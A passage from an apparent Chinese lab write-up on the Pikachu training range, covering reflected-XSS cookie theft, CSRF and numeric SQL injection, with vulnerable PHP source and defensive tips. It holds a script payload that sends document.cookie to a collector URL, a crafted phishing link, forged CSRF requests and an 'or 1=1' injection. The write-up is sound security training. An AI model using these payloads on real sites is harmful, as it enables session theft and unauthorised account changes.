</span></span></span><span class="line"><span class="cl"><span class="err">    $query=&#34;delete from cookies where id=$id&#34;;
</span></span></span><span class="line"><span class="cl"><span class="err">    execute($link, $query);
</span></span></span><span class="line"><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><h4 id="获取cookie">获取cookie</h4>
<p><img alt="img" src="./img/202209cookie-0.png"></p>
<p>以反射型XSS（GET）为例</p>
<p>payload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://light.asuka39.top:9000/pkxss/xcookie/cookie.php?cookie=&#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>钓鱼URL（URL编码后）：</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location%3D%27http%3A//light.asuka39.top%3A9000/pkxss/xcookie/cookie.php%3Fcookie%3D%27%20%2B%20document.cookie%3B%3C/script%3E&amp;submit=submit/
</code></pre><p>后台结果：</p>
<p><img alt="img" src="./img/202209cookie-1.png"></p>
<h4 id="钓鱼搁置">钓鱼（搁置）</h4>
<h4 id="获取键盘记录搁置">获取键盘记录（搁置）</h4>
<h2 id="csrf">CSRF</h2>
<h3 id="概述-2">概述</h3>
<p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为&quot;one click&quot;攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆，更有甚者会将其和越权问题混为一谈，这都是对原理没搞清楚导致的
这里列举一个场景解释一下，希望能够帮助理解</p>
<p><strong>场景需求：</strong>
田所想要修改远野在购物网站www.xx.com上填写的会员地址
先看下远野是如何修改自己的密码的：
登录&ndash;&gt;修改会员信息，提交请求&ndash;&gt;修改成功
所以田所想要修改远野的信息，他需要拥有：</p>
<ol>
<li>登录权限</li>
<li>修改个人信息的请求。</li>
</ol>
<p>但是远野又不会把自己xxx网站的账号密码告诉田所，那田所怎么办？
于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：
<code>http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change</code>
于是，他实施了这样一个操作：把这个链接伪装一下，在远野登录xxx网站后，欺骗他进行点击，远野点击这个链接后，个人信息就被修改了,田所就完成了攻击目的
为啥田所的操作能够实现呢？有如下几个关键点：</p>
<ul>
<li>网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造
<ul>
<li>因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作（增删改）是否容易被伪造</li>
</ul>
</li>
<li>远野点击了田所发给的链接，并且这个时候远野刚好登录在购物网上
<ul>
<li>如果远野安全意识高，不点击不明链接，则攻击不会成功；又或者即使远野点击了链接，但远野此时并没有登录购物网站，则攻击也不会成功</li>
</ul>
</li>
</ul>
<p>因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件，成功难度较高，因此被认为是危害较小的漏洞</p>
<p>当然，如果田所事先在xxx网的首页如果发现了一个XSS漏洞，则田所可能会这样做： 欺骗远野访问埋伏了XSS脚本（盗取cookie的脚本）的页面，远野中招，田所拿到远野的cookie，然后田所顺利登录到远野的后台，田所自己修改远野的相关信息</p>
<p>所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限；而XSS是直接盗取到了用户的权限，然后实施破坏。</p>
<p>那么如何来确认一个web系统存在CSRF漏洞呢</p>
<ul>
<li>对目标网站实施增删改的地方进行标记，观察其逻辑，判断请求是否可以被伪造
<ul>
<li>修改敏感信息时是否需要验证旧密码、验证邮箱等</li>
<li>修改敏感信息时有没有使用安全的token验证</li>
</ul>
</li>
<li>确认凭证的有效期
<ul>
<li>关闭浏览器后cookie是否还有效</li>
<li>session是否及时过期失效</li>
</ul>
</li>
</ul>
<p>网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作被伪造的情况：</p>
<ul>
<li>对敏感信息的操作使用安全的token验证</li>
<li>对敏感信息的操作增加安全的验证码</li>
<li>对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等</li>
</ul>
<h3 id="csrfgetpost">CSRF（GET&amp;POST）</h3>
<p>一个登录页面表单，用靶场给定的账号登录一下</p>
<p><img alt="img" src="./img/2022090-0-3.png"></p>
<p>登录后会显示一些个人信息</p>
<p><img alt="img" src="./img/2022090-login.png"></p>
<p>修改个人信息</p>
<p><img alt="img" src="./img/2022090-change.png"></p>
<p>提交之后好像没什么能利用的地方？别急，看看BurpSuite先</p>
<p><img alt="img" src="./img/2022090-change-bs.png"></p>
<p>发现submit的时候其实是向后台提交了一个GET请求：</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/csrf/csrfget/csrf_get_edit.php?sex=female&amp;phonenum=114514&amp;add=Japan&amp;email=114514%40homo.jp&amp;submit=submit
</code></pre><p>所有要修改的信息都写在URL里了，我们改一下URL：</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/csrf/csrfget/csrf_get_edit.php?sex=homo&amp;phonenum=1919810&amp;add=Tokyo&amp;email=1919810%40homo.jp&amp;submit=submit
</code></pre><p>homo的话想必性染色体事YY罢</p>
<p>提交一下</p>
<p><img alt="img" src="./img/2022090-fin.png"></p>
<p><strong>修改成功</strong></p>
<p>对于POST的情形，利用方法和之前的XSS基本一致，也是利用伪造的页面诱导被攻击者自己提交POST请求来完成攻击，这里不再赘述</p>
<h3 id="csrf-token">CSRF token</h3>
<p>依然是修改下信息抓个包看看</p>
<p><img alt="img" src="./img/2022090.png"></p>
<p>发现请求内多了token键值对</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/csrf/csrftoken/token_get_edit.php?sex=homo&amp;phonenum=1919810&amp;add=Tokyo&amp;email=114514%40homo.jp&amp;token=472526315b1db6cbdc282246404&amp;submit=submit
</code></pre><p>按照之前的方法尝试一下</p>
<pre tabindex="0"><code>http://light.asuka39.top:9000/vul/csrf/csrftoken/token_get_edit.php?sex=homo&amp;phonenum=114514&amp;add=Tokyo&amp;email=114514%40homo.jp&amp;token=472526315b1db6cbdc282246404&amp;submit=submit
</code></pre><p>可以看到信息并未被修改，可见token有效防范了CSRF</p>
<p><img alt="img" src="./img/2022090-fin.png"></p>
<p>CSRF有以下几种常见的防范措施：</p>
<ul>
<li>使用token验证
<ul>
<li>对关键操作增加token参数，token值必须随机</li>
</ul>
</li>
<li>使用关于安全的会话管理
<ul>
<li>不在客户端保存敏感信息（如身份验证信息）</li>
<li>测试直接关闭、退出时的会话过期机制</li>
<li>设置会话过期机制（如长时间无操作自动登录超时）</li>
</ul>
</li>
<li>访问控制安全管理
<ul>
<li>修改敏感信息需要二次验证</li>
<li>敏感信息修改使用POST请求</li>
<li>通过HTTP header中的<a href="https://baike.baidu.com/item/HTTP_REFERER/5358396?fr=aladdin">Referer</a>来限制原页面</li>
</ul>
</li>
<li>增加验证码验证</li>
</ul>
<h2 id="sql-inject">SQL Inject</h2>
<h3 id="概述-3">概述</h3>
<p>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面名列榜首的就是数据库注入漏洞。SQL注入是如此的著名，相信就算是没怎么了解过安全领域的路人也有过耳闻</p>
<p>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！</p>
<p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（拖库、删库、甚至整个服务器权限沦陷）</p>
<p>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：</p>
<ul>
<li>对传进SQL语句里面的变量进行过滤，不允许危险字符传入</li>
<li>使用参数化（Parameterized Query 或 Parameterized Statement）</li>
</ul>
<p>另外，目前有很多ORM框架会自动使用参数化解决注入问题，但其也提供了“拼接”的方式，所以使用时需要慎重！</p>
<p>SQL注入的主要流程：</p>
<ol>
<li>注入点探测
<ul>
<li>自动方式：使用web漏洞扫描工具自动进行注入点发现</li>
<li>手动方式：手工构造SQL Inject测试语句进行注入点发现</li>
</ul>
</li>
<li>信息获取
<ul>
<li>通过注入点获取期望得到的数据
<ul>
<li>环境信息：数据库类型、数据库版本、操作系统版本、用户信息等</li>
<li>数据库信息：数据库名称、数据库表、表字段、字段内容（加密内容破解）</li>
</ul>
</li>
</ul>
</li>
<li>获取权限
<ul>
<li>获取操作系统权限：通过数据库执行shell、上传木马</li>
</ul>
</li>
</ol>
<p>SQL常见注入点类型：</p>
<ul>
<li>数字型：<code>user_id=$id</code></li>
<li>字符型：<code>user_id='$id'</code></li>
<li>搜索型：<code>text LIKE '%{$_GET['search']}%'&quot;</code></li>
</ul>
<h3 id="数字型注入post">数字型注入（POST）</h3>
<p>来看到一个选择查询表单</p>
<p><img alt="img" src="./img/2022090-0.gif"></p>
<p>URL没有变化，故为POST请求。抓个包看看</p>
<p><img alt="img" src="./img/2022090-1-1.png"></p>
<p><img alt="img" src="./img/2022090-2-1.png"></p>
<p>假设这是一个注入点，我们来猜测一下从前端到后端的传参查询逻辑</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">PHP：</span><span class="nv">$id</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nx">SQL：select</span> <span class="nx">字段1</span><span class="p">,</span><span class="nx">字段2</span> <span class="nx">from</span> <span class="nx">表名</span> <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="nv">$id</span>
</span></span></code></pre></div><p>构造payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></div><p><img alt="img" src="./img/2022090-3-1.png"></p>
<p><strong>注入成功</strong></p>
<p>PHP源码：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="nx">strrpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">],</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$SELF_PAGE</span> <span class="o">=</span> <span class="s2">&#34;sqli_id.php&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$ACTIVE</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s2">&#34;inc/config.inc.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s2">&#34;inc/function.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s2">&#34;inc/mysql.inc.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$link</span><span class="o">=</span><span class="nx">connect</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">!=</span><span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//这里没有做任何处理，直接拼到select里面去了,形成SQL注入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$id</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select username,email from member where id=</span><span class="si">$id</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span><span class="o">=</span><span class="nx">execute</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//这里如果用==1,会严格一点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">mysqli_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="nv">$data</span><span class="o">=</span><span class="nx">mysqli_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$username</span><span class="o">=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$email</span><span class="o">=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=&#39;notice&#39;&gt;hello,</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2"> &lt;br /&gt;your email is: </span><span class="si">{</span><span class="nv">$email</span><span class="si">}</span><span class="s2">&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$html</span><span class="o">.=</span><span class="s2">&#34;&lt;p class=&#39;notice&#39;&gt;您输入的user id不存在，请重新输入！&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>登录到MySQL看看pikachu的数据库</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">tables</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">-------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">Tables_in_pikachu</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">-------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">httpinfo</span><span class="w">          </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">member</span><span class="w">            </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">message</span><span class="w">           </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">users</span><span class="w">             </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">xssblind</span><span class="w">          </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">-------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">5</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p>看看表member的字段</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">desc</span><span class="w"> </span><span class="n">member</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+------------------+------+-----+---------+----------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">Field</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="k">Type</span><span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="k">Null</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Key</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Default</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Extra</span><span class="w">          </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+------------------+------+-----+---------+----------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="nb">int</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="n">unsigned</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">PRI</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">auto_increment</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">66</span><span class="p">)</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">pw</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">sex</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="nb">char</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w">         </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">phonenum</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">address</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">email</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------+------------------+------+-----+---------+----------------+
